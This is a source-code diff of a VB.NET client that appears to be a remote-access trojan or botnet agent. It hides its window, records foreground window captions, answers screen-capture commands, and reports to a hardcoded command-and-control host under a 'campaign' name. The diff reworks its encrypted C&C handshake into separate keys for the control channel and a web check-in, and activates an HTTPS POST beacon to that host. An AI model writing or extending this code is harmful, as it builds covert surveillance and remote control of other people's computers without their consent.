@@ -74,9 +74,13 @@ Public Class Main
     ''' </summary>
     Public melts As Boolean = 0
     ''' <summary>
-    ''' Current AES password
+    ''' Current AES password for control
     ''' </summary>
-    Public Shared pw As String
+    Public Shared ccpw As String
+    ''' <summary>
+    ''' Current AES password for webserver
+    ''' </summary>
+    Public Shared webpw As String
     ''' <summary>
     ''' Current AES password
     ''' </summary>
@@ -216,7 +220,7 @@ Public Class Main
 #If DEBUG Then
         SetWindowTheme(Handle, "explorer", "")
         ''temporary preferences
-        HOST = "kahn.surfoye.com" ''IP
+        HOST = "la.chocolatkey.com" ''IP kahn.surfoye.com
         LANScan = True
         port = 92 ''Port
         cname = "LavenderTest" ''Client Name
@@ -234,7 +238,7 @@ Public Class Main
         Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None
         Me.Visible = False
         ''todo dimensions of form = main screen dimensions
-        HOST = "kahn.surfoye.com" ''IP
+        HOST = "la.chocolatkey.com" ''IP
         LANScan = True
         port = 92 ''Port
         name = "Surf" ''Campaign name
@@ -376,7 +380,7 @@ Public Class Main
         ForeTimer.Start()
     End Sub
     Private Sub Disconnected() Handles C.Disconnected
-        If trust Then
+        If cctrust Then
 #If DEBUG Then
             InfoLabel.Text = "Disconnected"
 #End If
@@ -389,43 +393,45 @@ Public Class Main
             ForeTimer.Enabled = False
         End If
 
-        trust = False
+        cctrust = False
     End Sub
 
-    Public Shared trust As Boolean = False ''Can server be trusted (resets every time)
+    Public Shared cctrust As Boolean = False ''Can c&c be trusted (resets every time)
+    Public Shared webtrust As Boolean = False ''Can webserver be trusted (resets every time)
     Public errorcount As Boolean = 0
     Dim kg As Crypt.RandomKeyGenerator = New Crypt.RandomKeyGenerator
 
-    Sub GenPass()
+    Function GenPass() As String
         kg.KeyLetters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
         kg.KeyNumbers = "0123456789"
         kg.KeyChars = 16 ''length can be changed
-        pw = kg.Generate()
+        Dim gened = kg.Generate()
 #If DEBUG Then
-        InfoLabel.Text = pw
+        InfoLabel.Text = gened
 #End If
-    End Sub
+        Return gened
+    End Function
 
 
     Private Sub Data(ByVal b As Byte()) Handles C.Data
         Try
             Dim T As String
-            If trust And Not BS(b).StartsWith(n.getscreen) Then
-                T = cryptor.Decrypt(BS(b), pw)
+            If cctrust And Not BS(b).StartsWith(n.getscreen) Then
+                T = cryptor.Decrypt(BS(b), ccpw)
             Else
                 T = BS(b)
             End If
 
             Dim A As String() = Split(T, Sep)
-            If Not trust Then
+            If Not cctrust Then
                 If A(0) = n.connect Then ''first connect
-                    GenPass()
+                    ccpw = GenPass()
                     cryptor = New Crypt.Aes256Base64Encrypter(cname) ''name is salt (todo: something more unique to the session?)
-                    C.Send(n.connect & Sep & Crypt.RSA.Encrypt(cname & Sep & pw, pk).AsBase64String)
-                ElseIf A(0) = n.response ''recieve key response
-                    If A(1) = Crypt.HMACSHA512Hasher.Base64Hash(pw) Then
+                    C.Send(n.connect & Sep & Crypt.RSA.Encrypt(cname & Sep & ccpw, pk).AsBase64String)
+                ElseIf A(0) = n.response Then ''recieve key response
+                    If A(1) = Crypt.HMACSHA512Hasher.Base64Hash(ccpw) Then
                         C.Send(n.response) ''report sucessful authentication
-                        trust = True ''above is the final unencrypted message
+                        cctrust = True ''above is the final unencrypted message
 #If DEBUG Then
                         InfoLabel.Text = "Authenticated"
 #End If
@@ -930,7 +936,7 @@ B:
     End Sub
 
     Private Sub ForeTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs)  ''500
-        If C.Statconnected And trust Then
+        If C.Statconnected And cctrust Then
             ''InfoLabel.Text = "Forewindows timer inc:" & inc
             inc += 1
             Dim CapTxt As String = GetCaption()
@@ -1001,14 +1007,18 @@ B:
         End If
     End Sub
     Private Sub ServeTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs) ''connect to lavender web
-        trust = False
+        cctrust = False
         Dim response As String
+        Dim webcryptor = New Crypt.Aes256Base64Encrypter(cname)
+        If Not cctrust Then
+            webpw = GenPass()
+        End If
         Try
             ''todo add https
-            ''response = WRequest("https://" & HOST & "/index.php", "0x1", "POST", "id=" & Crypt.AES.Encrypt(name, "hinki", Crypt.AES.salt, "SHA1", 1000, Crypt.AES.IV, 256) & "&iv=" & Crypt.AES.IV)
+            response = WRequest("https://" & HOST & "/index.php", "0x1", "POST", "k=" & webcryptor.Encrypt(Name, webpw))
         Catch : End Try
         'MsgBox(response)
-        ''Me.InfoLabel.Text = "WebRequest: " & response
+        Me.InfoLabel.Text = "WebRequest: " & response
     End Sub
 
     ''' <summary>
